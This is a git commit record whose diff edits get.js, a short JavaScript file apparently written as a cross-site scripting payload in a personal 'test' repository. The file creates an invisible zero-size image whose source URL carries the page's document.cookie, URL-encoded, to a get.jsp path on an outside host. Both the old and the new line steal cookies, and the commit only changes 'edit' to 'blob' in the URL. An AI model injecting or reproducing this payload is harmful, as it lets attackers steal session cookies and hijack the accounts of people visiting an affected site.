6ac34b308d03e004dcd68d2dae0c7bf313ae4efc
ESJiang <43910771+ESJiang@users.noreply.github.com>
2020-05-03 03:13:12 +1000

    Update get.js

--- get.js
+++ get.js
@@ -1,4 +1,4 @@
 var img = document.createElement('img');
 img.width = 0;
 img.height = 0;
-img.src = 'https://github.com/ESJiang/test/edit/master/get.jsp?msg='+encodeURIComponent(document.cookie);
+img.src = 'https://github.com/ESJiang/test/blob/master/get.jsp?msg='+encodeURIComponent(document.cookie);
